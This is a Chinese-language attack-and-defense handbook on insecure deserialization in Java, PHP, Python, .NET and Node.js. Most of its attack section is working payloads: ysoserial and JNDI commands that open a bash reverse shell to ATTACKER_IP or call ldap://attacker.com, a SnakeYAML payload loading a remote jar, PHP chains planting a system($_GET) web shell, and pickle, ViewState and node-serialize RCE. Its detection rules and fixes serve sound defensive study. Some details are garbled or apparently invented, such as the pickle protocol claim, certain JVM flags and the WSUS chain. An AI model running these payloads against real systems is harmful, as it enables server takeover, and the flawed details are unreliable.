---
name: web-deserialization
description: >
  全面覆盖不安全反序列化（Insecure Deserialization）漏洞的识别、利用、检测和修复。
  涵盖 Java（原生序列化、XMLDecoder、SnakeYAML、Fastjson、Jackson、XStream）、
  PHP（serialize/unserialize、Phar 反序列化）、Python（pickle、PyYAML）、
  .NET（BinaryFormatter、ViewState、Json.NET）、Node.js（node-serialize），
  包含 gadget chain 构造、ysoserial/phar:// 利用、RCE 链分析、
  利用链自动化工具（ysoserial、marshalsec、ysoserial.net），
  以及防御侧的白名单反序列化、签名验证、类型安全替代方案。
domain: cybersecurity
subdomain: web-security
tags: [deserialization, insecure-deserialization, java-serialization, php-unserialize, pickle, ysoserial, gadget-chain, rce, owasp-a08]
version: 2.0.0
---

# 不安全反序列化 — 完整攻防手册

## 适用场景

- Java 应用接受序列化对象（`ObjectInputStream`、`XStream`、XMLDecoder）
- PHP 应用使用 `unserialize()` 或接受 Phar 文件
- Python 应用使用 `pickle.loads()` 或 `yaml.load()`
- .NET 应用使用 `BinaryFormatter`、`ViewState` 反序列化
- REST API 接受 JSON/XML 且后端使用带有 gadget chain 的库（Jackson、Fastjson）
- 渗透测试中发现 HTTP 请求中存在 `rO0AB`（Java Base64）、`O:8:`（PHP 序列化）等特征

**不适用**：XSS、SQLi、SSRF 等其他注入类型

---

## Part A：攻击方法论

### 1. 漏洞识别

#### 1.1 序列化格式识别

```
# Java 原生序列化（二进制）
# Magic bytes: 0xAC 0xED (Base64: rO0AB 或 rO0A)
# HTTP 请求中的特征：
Cookie: JSESSIONID=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...
POST body: %AC%ED%00%05...
Content-Type: application/x-java-serialized-object
Content-Type: application/octet-stream (含 Java magic bytes)

# PHP 序列化（文本）
# 特征: O:<class_len>:"<class>":<prop_count>:{...}
# 示例: O:8:"UserInfo":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
Cookie: user=O%3A8%3A%22UserInfo%22%3A2%3A...
POST body: data=O:8:"UserInfo":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

# Python pickle
# Magic bytes: 0x80 (protocol 8), 0x80 0x04 (protocol 4)
# Base64: gASV...
Content-Type: application/python-pickle

# .NET BinaryFormatter
# Magic bytes: 0x00 0x01 0x00 0x00 (在 Base64 中开头为 AAEAAA...)
ViewState 参数（ASP.NET）
__VIEWSTATE=/wEPDwUKMTY1NDU...

# JSON/XML 反序列化（间接）
# 使用 Jackson/Fastjson/XStream 且配置不当时
Content-Type: application/json
{"@type":"com.sun.rowset.JdbcRowSetImpl",...}
```

#### 1.2 自动化检测

```bash
# Java Deserialization Scanner（Burp 插件）
# 检测常见 Java 反序列化漏洞

# ysoserial 检测（DNS 回调验证）
java -jar ysoserial.jar URLDNS "http://YOUR_COLLABORATOR_PAYLOAD" | base64 -w0
# 将生成的 payload 放入请求中，观察 DNS 回调

# PHP 反序列化检测
# 查找 unserialize() 调用 + 用户可控输入
grep -rn "unserialize(" --include="*.php" .
# 查找 Phar 反序列化利用点
grep -rn "file_exists\|is_file\|is_dir\|filemtime\|stat\|file_get_contents\|fopen" --include="*.php" . | grep -v "vendor/"

# .NET ViewState 检测
# 使用 ViewState 检测工具
# 若 MAC 验证禁用 → 可直接反序列化利用
# 若 MAC 验证启用 → 需要机器密钥
```

### 2. Java 反序列化利用

#### 2.1 ysoserial 利用链

```bash
# ysoserial — Java 反序列化利用工具
# 语法: java -jar ysoserial.jar <gadget_chain> <command>

# 列出所有 gadget chain
java -jar ysoserial.jar

# 常用 gadget chain
# CommonsCollections1-7 (Apache Commons Collections)
java -jar ysoserial.jar CommonsCollections6 "id" | base64 -w0

# CommonsBeanutils1 (Apache Commons BeanUtils)
java -jar ysoserial.jar CommonsBeanutils1 "whoami" | base64 -w0

# Spring1 (Spring Framework)
java -jar ysoserial.jar Spring1 "cat /etc/passwd" | base64 -w0

# URLDNS（仅 DNS 查询，用于验证漏洞存在）
java -jar ysoserial.jar URLDNS "http://attacker.com/test" | base64 -w0

# 生成反向 shell payload
java -jar ysoserial.jar CommonsCollections6 "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | base64 -w0

# JRMPClient（配合 JRMP Listener）
java -jar ysoserial.jar JRMPClient "attacker_ip:1099"
```

#### 2.2 Fastjson 反序列化

```json
// Fastjson 1.2.24 — JdbcRowSetImpl JNDI 注入
// 发送 JSON payload 触发 JNDI 远程类加载
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com:1389/Exploit",
    "autoCommit": true
}

// Fastjson 1.2.47 — 缓存绕过
{
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
}
// 后续请求使用 JdbcRowSetImpl

// Fastjson 自动化利用工具
// https://github.com/kozmer/log4j-shell-poc 类似原理
// 使用 JNDI-Injection-Exploit 工具搭建恶意 LDAP/RMI 服务
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'" -A ATTACKER_IP
```

#### 2.3 Jackson 反序列化

```json
// Jackson enableDefaultTyping() 开启时的利用
// 条件: ClassPathXmlApplicationContext 在 classpath
["com.sun.rowset.JdbcRowSetImpl", {
    "dataSourceName": "ldap://attacker.com/Exploit",
    "autoCommit": true
}]

// Spring cve-2020-5421 (RFD)
// 利用条件: Jackson 版本 + 特定 gadget class
```

#### 2.4 XMLDecoder / XStream

```xml
<!-- XMLDecoder 反序列化 RCE -->
<java>
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="1">
      <void index="0"><string>calc</string></void>
    </array>
    <void method="start"/>
  </object>
</java>

<!-- XStream 反序列化 (CVE-2021-21351) -->
<sorted-set>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>test</type>
    <value class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl">
      <bytecodes>
        <byte-array>BASE64_ENCODED_CLASS</byte-array>
      </bytecodes>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
</sorted-set>
```

### 3. PHP 反序列化利用

#### 3.1 基本利用

```php
// PHP 对象注入
// 假设存在危险类：
class Logger {
    public $logFile;
    public $logData;
    function __destruct() {
        file_put_contents($this->logFile, $this->logData);
    }
}

// 构造恶意对象
$payload = new Logger();
$payload->logFile = 'shell.php';
$payload->logData = '<?php system($_GET["cmd"]); ?>';
echo serialize($payload);
// O:6:"Logger":2:{s:7:"logFile";s:9:"shell.php";s:7:"logData";s:32:"<?php system($_GET["cmd"]); ?>";}
```

#### 3.2 魔术方法利用链

```php
// 常见利用魔术方法
// __destruct() / __wakeup() → 对象销毁/反序列化时触发
// __toString() → 对象被当作字符串使用时触发
// __call() → 调用不存在的方法时触发
// __get() / __set() → 访问/设置不存在属性时触发
// __invoke() → 对象被当作函数调用时触发

// POP chain 构造示例
class FileHandler {
    function __destruct() {
        // 当对象销毁时写入文件
        $this->writer->write($this->data);
    }
}
class CacheManager {
    function write($data) {
        // 委托给另一个 writer
        $this->cacheWriter->save($this->key, $data);
    }
}
class TemplateEngine {
    function save($key, $data) {
        // 最终写入文件
        file_put_contents($key . '.php', $data);
    }
}
// POP chain: FileHandler::__destruct() → CacheManager::write() → TemplateEngine::save()
// 构造 payload:
$te = new TemplateEngine();
$cm = new CacheManager();
$cm->cacheWriter = $te;
$cm->key = 'shell';
$fh = new FileHandler();
$fh->writer = $cm;
$fh->data = '<?php system($_GET["cmd"]); ?>';
echo serialize($fh);
```

#### 3.3 Phar 反序列化

```php
// Phar 反序列化 — 通过文件操作触发
// 任何使用 Phar 包装器的文件操作都可能触发反序列化
// 受影响的函数: file_exists(), is_file(), is_dir(), filemtime(),
// stat(), file_get_contents(), fopen(), file(), parse_ini_file()

// 创建恶意 Phar 文件
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$malicious = new EvilClass(); // 含 __destruct 或 __wakeup
$phar->setMetadata($malicious);
$phar->stopBuffering();

// 利用方式（无需直接调用 unserialize）
// 上传 evil.phar 后，通过以下方式触发：
file_exists('phar://uploads/evil.phar');
file_get_contents('phar://uploads/evil.phar');

// 也支持 phar:// 包装器扩展名欺骗
// evil.png（实际是 phar）→ phar://uploads/evil.png

// PHPGGC — PHP 反序列化利用工具
// phpggc Laravel/RCE1 "cat /etc/passwd"
// phpggc Symfony/RCE3 "id"
// phpggc --filter laravel  # 过滤 Laravel gadget chain
```

### 4. Python 反序列化利用

```python
# pickle 反序列化 RCE
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        # __reduce__ 在 pickle.loads() 时执行
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
# 或直接构造
payload = b'\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x8c\x06system\x93\x8c\x02id\x85R.'

# 发送到目标应用
import base64
encoded = base64.b64encode(payload).decode()
# 将 encoded 放入 HTTP 请求中

# PyYAML 不安全加载
import yaml
# yaml.load() 默认允许任意 Python 对象
payload = '''!!python/object/apply:os.system ["id"]'''
yaml.load(payload)  # RCE!

# yaml.safe_load() 不受影响（推荐使用）
```

### 5. .NET 反序列化利用

```bash
# ysoserial.net — .NET 反序列化利用
# 语法: ysoserial.exe -g <gadget> -f <formatter> -c <command>

# BinaryFormatter gadget
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c calc.exe" -o base64

# ViewState 反序列化
# 步骤 1：获取机器密钥（通过其他漏洞或配置错误）
# 步骤 2：生成恶意 ViewState
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "cmd /c calc.exe" -o base64

# ActivitySurveillanceToken gadget
ysoserial.exe -g ActivitySurveillanceToken -f BinaryFormatter -c "cmd /c whoami"

# 使用 ViewState 编码密钥
# 需要的参数: __VIEWSTATEGENERATOR, validationKey, decryptionKey
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "cmd /c whoami" \
  --generator=GENERATOR_ID \
  --validationalg=SHA1 \
  --validationkey=VALIDATION_KEY \
  --decryptionalg=AES \
  --decryptionkey=DECRYPTION_KEY \
  -o base64
```

### 6. Node.js 反序列化

```javascript
// node-serialize 反序列化 RCE
// 恶意 payload（IIFE 形式）
var payload = {
    rce: function() {
        return require('child_process').execSync('id').toString();
    }.toString() + '()'
};
var serialized = require('node-serialize').serialize(payload);
// {"rce":"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString();}()"}

// 反序列化时自动执行 IIFE
require('node-serialize').unserialize(serialized);
```

#### 6.1 js-yaml 深层 gadget（`__proto__` → RCE）

- `js-yaml`（旧版）用 `yaml.load()`（默认非 safe）时，YAML 里的 `!!js/function` 标签可构造
  函数，配合 Node.js 的 `Function` 构造器在加载时执行。
- 更现代的攻击走**原型污染**：YAML 的嵌套 key 污染 `Object.prototype`，再经下游 gadget 链到 RCE。

```yaml
# 概念 payload（!!js/function 标签，需 yaml.load 非 safe）
"rce": !!js/function "function(){ return require('child_process').execSync('id').toString(); }"
```

```javascript
// __proto__ 污染入口（若下游有 merge/deep-extend 类 sink）
const yaml = require('js-yaml');
const obj = yaml.load('__proto__:\n  polluted: "yes"');  // 旧版可能污染原型
// 再触发下游 gadget：polluted 被当作存在属性 → 影响模板/命令拼接 → RCE
```

#### 6.2 现代原型污染 → RCE 链（Node.js）

1. **污染入口**：`__proto__` / `constructor.prototype` 经 JSON/YAML/query parser（`qs`、`qs` 的
   `allowPrototypes`、`deepmerge`）写入。
2. **gadget 链**：污染 `Object.prototype` 上的常用字段（如 `shell`、`env`、`argv`、`NODE_OPTIONS`），
   当应用用 `child_process.exec`/`spawn`/`execFile` 且未显式指定这些字段时被继承。
3. **RCE 触发**：

```javascript
// 污染 NODE_OPTIONS / 环境字段后，触发 spawn
// 例：污染 env.NODE_OPTIONS = "--require /proc/self/environ"
// 或污染 shell 字段指向恶意程序
child_process.spawn(cmd, args, {})  // 未指定 env/shell → 继承被污染的原型
```

4. **判据**：污染后，`spawn/exec` 继承了被污染字段并执行了非预期命令 = 链成立。
   （详见 `prototype-pollution-advanced.md` 的服务端 RCE gadget 节。）

#### 6.3 其他 Node.js 反序列化面

- `node-serialize` / `serialize-javascript`（若 `eval` 化）+ `unserialize` IIFE。
- `funcster`、`js-yaml` 非 safe load、`nedb` 注入。
- `eval`/`new Function` 对不可信字符串的求值。

**判据**：仅当「不可信数据被反序列化/加载后执行了代码」才算 RCE；`safe_load`/白名单加载不受影响。

---

## Part B：检测与防御

### 7. 检测规则

#### 7.1 Sigma 规则

```yaml
title: Java 反序列化攻击检测
status: experimental
logsource:
    category: webserver
detection:
    selection_header:
        c-request|contains:
            - 'rO0AB'      # Java Base64 magic
            - '%AC%ED'     # Java URL-encoded magic
            - 'aced0005'   # Java hex magic
    selection_content_type:
        cs-content-type|contains:
            - 'application/x-java-serialized-object'
            - 'application/octet-stream'
    selection_fastjson:
        c-body|contains|all:
            - '@type'
            - 'JdbcRowSetImpl'
    selection_php:
        c-body|contains:
            - 'O:8:"'
            - 'phar://'
    condition: selection_header or selection_content_type or selection_fastjson or selection_php
level: critical
tags:
    - attack.t1190
    - cve.2015-4852
    - cve.2017-9805
```

#### 7.2 ModSecurity 规则

```apache
# 检测 Java 序列化 magic bytes
SecRule REQUEST_BODY "@contains \xAC\xED\x00\x05" \
  "id:2001,phase:2,deny,status:403,msg:'Java serialization magic bytes detected'"

# 检测 Base64 编码的 Java 序列化
SecRule REQUEST_BODY|REQUEST_COOKIES "@rx rO0AB[A-Za-z0-9+/=]+" \
  "id:2002,phase:2,deny,status:403,msg:'Base64 Java serialization detected'"

# 检测 Fastjson @type 注入
SecRule REQUEST_BODY "@contains @type" \
  "id:2003,phase:2,deny,status:403,msg:'Fastjson @type injection detected',\
  chain"
  SecRule REQUEST_BODY "@rx JdbcRowSetImpl|TemplatesImpl|JndiDataSource"

# 检测 PHP 序列化对象注入
SecRule REQUEST_BODY|REQUEST_COOKIES "@rx O:[0-9]+:\"[^\"]+\":[0-9]+:" \
  "id:2004,phase:2,deny,status:403,msg:'PHP serialized object injection detected'"

# 检测 pickle payload
SecRule REQUEST_BODY "@rx \x80\x04\x95|__reduce__|!!python/object" \
  "id:2005,phase:2,deny,status:403,msg:'Python pickle deserialization detected'"
```

### 8. 修复方案

#### 8.1 Java 修复

```java
// 修复 1：使用白名单反序列化过滤（ObjectInputFilter — Java 9+）
ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(filterInfo -> {
    if (filterInfo.serialClass() != null) {
        Class<?> clazz = filterInfo.serialClass();
        // 只允许特定类
        if (clazz.getName().startsWith("com.myapp.dto.")) {
            return ObjectInputFilter.Status.ALLOWED;
        }
        return ObjectInputFilter.Status.REJECTED;
    }
    return ObjectInputFilter.Status.UNDECIDED;
});

// 修复 2：使用 SerialKiller 库
// https://github.com/kantega/notsoserial
// 配置白名单/黑名单

// 修复 3：替换为 JSON 序列化
// 使用 Jackson/Gson 替代 Java 原生序列化
ObjectMapper mapper = new ObjectMapper();
// 禁用默认类型推断
// mapper.enableDefaultTyping() ← 不要这样做！
MyDto dto = mapper.readValue(json, MyDto.class); // 使用具体类型
```

```java
// 修复 4：Fastjson 安全配置
// 升级到 Fastjson2 或配置 autoType 白名单
ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
// 或使用白名单
ParserConfig.getGlobalInstance().addAccept("com.myapp.");

// 修复 5：XStream 安全框架
XStream xstream = new XStream();
xstream.addPermission(NoTypePermission.NONE); // 禁止所有
xstream.addPermission(new TypePermission() {
    public boolean allows(Class type) {
        return type.getName().startsWith("com.myapp.");
    }
});
```

#### 8.2 PHP 修复

```php
// 修复 1：禁用 unserialize 或使用 allowed_classes
$data = unserialize($input, ["allowed_classes" => false]); // 禁止所有对象
$data = unserialize($input, ["allowed_classes" => ["SafeClass1", "SafeClass2"]]);

// 修复 2：使用 JSON 替代 serialize
$data = json_decode($input, true); // 安全替代

// 修复 3：phar 防御
// 在 php.ini 中禁用 phar 包装器
disable_functions = ... ; 加上 phar 相关函数
// 或在文件操作前验证路径
$path = realpath($userInput);
if (strpos($path, 'phar://') === 0) {
    throw new SecurityException('Phar wrapper not allowed');
}
```

#### 8.3 Python 修复

```python
# 修复 1：使用 json 替代 pickle
import json
data = json.loads(user_input)  # 安全，无代码执行

# 修复 2：pickle 白名单（受限）
import pickle
class SafeUnpickler(pickle.Unpickler):
    ALLOWED_CLASSES = {
        'builtins': {'dict', 'list', 'tuple', 'set', 'str', 'int', 'float', 'bool'},
        'myapp.models': {'UserDTO', 'ProductDTO'},
    }
    def find_class(self, module, name):
        if module in self.ALLOWED_CLASSES and name in self.ALLOWED_CLASSES[module]:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"Forbidden: {module}.{name}")

# 修复 3：PyYAML 安全加载
import yaml
data = yaml.safe_load(user_input)  # 使用 safe_load 而非 load
```

#### 8.4 .NET 修复

```csharp
// 修复 1：移除 BinaryFormatter 使用
// 替换为 JSON 序列化
using System.Text.Json;
var data = JsonSerializer.Deserialize<MyDto>(jsonString);

// 修复 2：如果必须使用，添加类型过滤
// .NET 7+ 使用 ISerializationBinder
public class SafeBinder : SerializationBinder {
    private static readonly string[] AllowedTypes = {
        "MyApp.DTOs.UserDTO",
        "MyApp.DTOs.ProductDTO"
    };
    public override Type BindToType(string assemblyName, string typeName) {
        if (AllowedTypes.Contains(typeName))
            return Type.GetType($"{typeName}, {assemblyName}");
        throw new SerializationException($"Type not allowed: {typeName}");
    }
}

// 修复 3：ViewState 安全
// 确保在 web.config 中启用 MAC 验证
// <machineKey validationKey="AUTOGENERATED" decryptionKey="AUTOGENERATED" />
// 不要将 validationKey 设置为已知值或移除验证
```

---

## 速查表

### 反序列化漏洞类型速查

| 语言 | 格式 | 特征 | 利用工具 | RCE 方式 |
|------|------|------|---------|---------|
| Java | 二进制 | `0xACED` / `rO0AB` | ysoserial | gadget chain |
| Java | JSON | `@type` | Fastjson exploit | JNDI 注入 |
| Java | XML | `<java>` / XStream | marshalsec | XMLDecoder / XStream gadget |
| PHP | 文本 | `O:N:"Class"` | PHPGGC | 魔术方法 POP chain |
| PHP | Phar | `phar://` | 自制 phar | Phar 元数据反序列化 |
| Python | 二进制 | `\x80\x04` / `__reduce__` | 自制 pickle | `__reduce__` + os.system |
| Python | YAML | `!!python/` | 无 | PyYAML unsafe load |
| .NET | 二进制 | `AAEAAA` / ViewState | ysoserial.net | BinaryFormatter gadget |
| Node.js | JSON | `_$$ND_FUNC$$_` | 自制 | IIFE 自动执行 |

### Java Gadget Chain 选择矩阵

| Gadget | 依赖 | JDK 版本 | 命令执行 | 文件写入 | 适用场景 |
|--------|------|---------|---------|---------|---------|
| CommonsCollections1-7 | commons-collections 3.x/4.x | 7-8 | Yes | No | 经典利用 |
| CommonsBeanutils1 | commons-beanutils | 7+ | Yes | No | 无 CC 依赖时 |
| Spring1 | spring-core | 7+ | Yes | No | Spring 应用 |
| Groovy1 | groovy | 7+ | Yes | No | Groovy 环境 |
| URLDNS | JDK only | 7+ | No (DNS) | No | 漏洞验证 |
| JRMPClient | JDK only | 7+ | No | No | 配合 JRMP listener |

### 漏洞验证流程

```
1. 识别序列化格式 → 2. 查找入口点 → 3. 确认 classpath gadget → 4. 生成 payload → 5. 验证利用

步骤 3 的确认方法：
- Java: 扫描 WEB-INF/lib/ 下的 jar 文件
- PHP: 查找 composer.lock / vendor/ 目录
- Python: 查找 requirements.txt
- .NET: 查找 web.config / bin/ 目录
```

---

## MITRE ATT&CK 映射

| Tactic | Technique ID | Technique Name | 本 Skill 覆盖 |
|--------|-------------|----------------|---------------|
| Initial Access | T1190 | Exploit Public-Facing Application | 反序列化入口点利用 |
| Execution | T1059 | Command and Scripting Interpreter | 通过反序列化执行系统命令 |
| Execution | T1203 | Exploitation for Client Execution | Java Applet / .NET ViewState |
| Privilege Escalation | T1068 | Exploitation for Privilege Escalation | 服务器端反序列化 RCE |
| Defense Evasion | T1027 | Obfuscated Files | Base64 编码 payload |
| Lateral Movement | T1210 | Exploitation of Remote Services | JNDI/RMI 远程利用 |

---

## 前置条件

- 理解面向对象编程和序列化/反序列化原理
- Java/PHP/Python/.NET 基础知识（至少一种）
- Burp Suite 或 OWASP ZAP 用于请求拦截和修改
- ysoserial / PHPGGC / ysoserial.net 工具包
- 目标应用存在接受序列化数据的入口点
- 了解 classpath / 依赖库信息有助于选择正确的 gadget chain

---

## Part C：2025-2026 最新研究与 CVE

### C1. CVE-2025-53770 — SharePoint ToolShell 反序列化 RCE（2025-07，CVSS 9.8）

2025 年最重要的 .NET 反序列化漏洞之一，**野外主动利用中**。

#### C1.1 漏洞概况

- **影响**: Microsoft SharePoint Server 2016 / 2019 / Subscription Edition（本地部署版）
- **类型**: 不受信任数据反序列化 → 未授权 RCE
- **CVSS**: 9.8（严重）
- **别名**: ToolShell（攻击链名称）
- **状态**: 野外零日利用，2025-07-12 Microsoft 紧急修复

#### C1.2 利用链

```
1. 攻击者上传特制文件（如 .aspx、.master、配置文件）到 SharePoint 站点
2. SharePoint 服务在处理时对攻击者控制的数据进行反序列化
3. 利用 .NET BinaryFormatter / XmlSerializer 等危险序列化器
4. 通过 ObjectStateFormatter / LosFormatter 触发 gadget
5. 在 SharePoint 应用池账户（通常高权限）上下文执行任意代码

关键: 即使没有认证,也可通过 SharePoint 公开的 upload/preview 功能触发
```

#### C1.3 影响

- 完整服务器接管
- 内网横向移动起点
- 数据窃取（SharePoint 文档库）
- 凭据窃取（应用池账户通常有 SQL/AD 权限）

#### C1.4 检测与防御

```powershell
# 1. 检测异常文件上传（ suspicious .master / .aspx）
Get-SPWeb | ForEach-Object {
    $_.Lists | Where-Object { $_.BaseType -eq "DocumentLibrary" } | ForEach-Object {
        $_.Items | Where-Object { $_.Name -match "\.(master|aspx|asmx)$" }
    }
}

# 2. 监控 w3wp.exe 异常子进程
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object { $_.Id -eq 1 -and $_.Properties[5].Value -match "w3wp.exe" -and
                 $_.Properties[6].Value -match "cmd|powershell|certutil" }

# 3. 应用 2025-07 累积更新
# https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities/
```

来源: [Rapid7 — CVE-2025-53770 ETR](https://www.rapid7.com/blog/post/etr-zero-day-exploitation-of-microsoft-sharepoint-servers-cve-2025-53770/) / [ZeroPath — ToolShell](https://zeropath.com/blog/cve-2025-53770-sharepoint-deserialization-rce) / [Contrast Security — ToolShell](https://www.contrastsecurity.com/security-influencers/inside-the-toolshell-zero-day-sharepoints-insecure-deserialization-flaw) / [Zscaler ThreatLabz](https://www.zscaler.com/blogs/security-research/cve-2025-53770-zero-day-exploit-impacts-microsoft-sharepoint-services) / [GitHub POC](https://github.com/MuhammadWaseem29/CVE-2025-53770)

---

### C2. CVE-2025-59287 — WSUS 反序列化 RCE（CVSS 9.8）

#### C2.1 漏洞概况

- **影响**: Microsoft Windows Server Update Services（WSUS）
- **类型**: 未授权反序列化 → RCE
- **CVSS**: 9.8
- **入口**: WSUS 的 SQL Server / API 端点

#### C2.2 利用链

```
1. 攻击者识别目标 WSUS 实例（默认 8530/8531 端口）
2. 利用 SQL Server SqlServerManagementUI vs. .NET XmlSerializer 不匹配
3. 通过 Cookie / Header 注入序列化对象
4. 服务端在 ASP.NET Session 反序列化时触发 gadget
5. SYSTEM 权限执行任意代码（WSUS 默认 LocalSystem）

关键: 不需要认证，可远程利用
```

#### C2.3 防御

- 应用 Microsoft 2025-08 补丁
- 限制 WSUS 端口访问（仅 Domain Controller 可访问）
- 监控异常 Cookie 体积（序列化对象通常较大）

来源: [Picus Security — CVE-2025-59287](https://www.picussecurity.com/resource/blog/cve-2025-59287-explained-wsus-unauthenticated-rce-vulnerability) / [Unit 42 Analysis](https://unit42.paloaltonetworks.com/microsoft-cve-2025-59287/) / [OffSec Deep Dive](https://www.offsec.com/blog/recent-vulnerabilities-in-wsus-service/) / [SentinelOne CVE-2025-59287](https://www.sentinelone.com/vulnerability-database/cve-2025-59287/)

---

### C3. CVE-2025-24813 — Apache Tomcat 反序列化 RCE

#### C3.1 漏洞概况

- **影响**: Apache Tomcat（特定配置）
- **类型**: Partial PUT + Path Equivalence + 反序列化
- **条件**: 需开启 PUT 方法 + 默认 servlet 写权限 + 特定 classpath

#### C3.2 利用链

```
1. Tomcat 开启 PUT（默认关闭）
2. 攻击者 PUT 一个 .java 文件作为 partial upload
3. Path Equivalence 让 Tomcat 把它识别为 .jsp
4. JSP 文件被编译并执行
5. 通过 Java session 反序列化 gadget 提升至完整 RCE

关键: 需要 default servlet write enabled + serialize classpath (如 commons-collections)
```

来源: [HeroDevs — CVE-2025-24813](https://www.herodevs.com/blog-posts/cve-2025-24813-remote-code-execution-in-apache-tomcat-via-partial-put-path-equivalence) / [Medium — Tomcat 反序列化 Part 2](https://medium.com/beyond-devsecops/remote-code-execution-in-apache-tomcat-via-java-deserialization-cve-2025-24813-part-2-98dd576caa59)

---

### C4. CVE-2024-42323 — Apache HertzBeat SnakeYAML 反序列化

phithon 在 [先知社区 — SnakeYAML 反序列化](https://www.leavesongs.com/PENETRATION/jdbc-injection-with-hertzbeat-cve-2024-42323.html) 披露：

#### C4.1 漏洞概况

- **影响**: Apache HertzBeat（incubating）< 1.6.0
- **类型**: SnakeYAML 不安全反序列化 → RCE
- **根因**: `new Yaml().load(userInput)` 不安全初始化
- **前置**: SnakeYAML < 2.0（CVE-2022-1471）

#### C4.2 利用链

```yaml
# Payload 通过 HertzBeat 监控配置注入
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/exploit.jar"]
  ]]
]
# 加载远程恶意 jar
# jar 中 META-INF/services/javax.script.ScriptEngineFactory 实现
# 触发 static initializer → RCE
```

#### C4.3 JDBC 注入链

phithon 进一步分析 HertzBeat 中 JDBC URL 注入 → MySQL 服务器反序列化：
```
1. 攻击者控制 JDBC URL（如 MySQL 监控配置）
2. JDBC 连接到攻击者控制的 MySQL 服务器
3. 恶意 MySQL 通过 JDBC 序列化协议返回 gadget
4. 触发 commons-collections 等 gadget chain
5. RCE
```

#### C4.4 防御

```yaml
# SnakeYAML 2.0+ 使用 SafeConstructor
Yaml yaml = new Yaml(new SafeConstructor());
# 或迁移到 Jackson YAML
```

来源: [CertCube — HertzBeat SnakeYAML](https://blog.certcube.com/snakeyaml-deserialization-rce-cve-2024-42323/) / [yulate.github.io — Native Deser Analysis](https://yulate.github.io/post/g7fC6A2EUF/)

---

### C5. CVE-2026-27830 — c3p0 Java 反序列化

[GHSA-5476-xc4j-rqcv](https://github.com/advisories/GHSA-5476-xc4j-rqcv)：

- **影响**: c3p0 连接池库
- **类型**: 通过 `javax.naming.Reference` 反序列化
- **POC 思路**:
```java
// c3p0 的 WrapperConnectionPoolDataSource
// 接受序列化的 Reference 对象
// 通过 JNDI 加载远程 classpath
// 触发 static initializer → RCE
```

---

### C6. 学术研究：Sleeping Giants（2025 ACM）

[Sleeping Giants — Activating Dormant Java Deserialization Gadgets](https://dl.acm.org/doi/10.1145/3719027.3765031)：

**核心发现**:
- 绝大多数已知 gadget chain 来源于**软件依赖**
- 即使应用本身没有已知 gadget，依赖库中可能存在**休眠 gadget**
- 通过小的代码变更（如增加 `setter` / `getter`）即可激活休眠 gadget
- 攻击者可主动激活 / 触发非公共字段的反序列化

**对防御的启示**:
- 仅"清理已知 gadget" 不足
- 必须做完整的 classpath 扫描
- 使用 JEP 290 反序列化过滤器

---

### C7. Atredis "Finding Gadgets Like it's 2026"

[Atredis Partners — 2026 Gadget 研究](https://www.atredis.com/blog/2026/3/12/findings-gadgets-like-its-2026)：

**2026 年寻找 gadget 的新方法**:
1. **静态字节码分析**: ASM / javap 自动识别 readObject / Serializable 实现
2. **动态污点分析**: Java Agent 追踪 ObjectInputStream 流向
3. **大语言模型辅助**: GPT/Claude 解析字节码识别潜在 gadget
4. **供应链扫描**: 在 Maven Central 上扫描特定类签名

**2026 热点 gadget 库**:
- Apache Commons Collections（仍为主力）
- ROME（RSS 解析）
- Hibernate
- Spring Framework
- Jackson（含 polymorphic types）

---

### C8. Java 17+ 反序列化绕过

[OWASP Stuttgart — Recent Java Versions](https://owasp.org/www-chapter-stuttgart/assets/slides/2024-12-10_Exploiting_deserialization_vulnerabilities_in_recent_Java_versions.pdf)：

#### C8.1 JEP 290 反序列化过滤器

Java 9+ 引入 `ObjectInputFilter`，可在反序列化前过滤类。

**绕过方式**:
```java
// 1. 通过 Unwrap / Proxy 触发未被过滤的类
// 2. 利用 lambda / method handle 绕过类签名检查
// 3. 通过 PriorityQueue / HashSet 等容器触发嵌入对象的反序列化
```

#### C8.2 模块化系统（JPMS）

Java 9+ 引入模块系统，限制反射访问：
- `setAccessible(true)` 对命名模块中的类失效
- 但通过 `jdk.internal.misc.Unsafe` 仍可绕过
- ysoserial 已更新支持 Java 17+ gadget

#### C8.3 防御（2025）

```bash
# 启用 JEP 290 全局过滤器
-Djdk.serialFilter="!java.lang.Runtime;!java.lang.ProcessBuilder;..."

# 启用 serialver 校验
-Djdk.serialSetObjectAfterFilter=true

# 禁用 ObjectInputStream.readObject()（生产环境）
-Djdk.serialFilter.allow-non-public=false

# 应用 JEP 411（弃用 SecurityManager）
# 使用现代模块化访问控制
```

---

### C9. Fastjson RASP 视角（中文社区精华）

[长亭百川云 — RASP 视角下的 FastJson 反序列化](https://rivers.chaitin.cn/blog/cq951vh0lnechd244iqg)：

**Fastjson 1.2.80 绕过**:
```java
// fastjson < 1.2.80 的 autoType 黑名单可绕过
// 通过 expectClass 二次类型解析
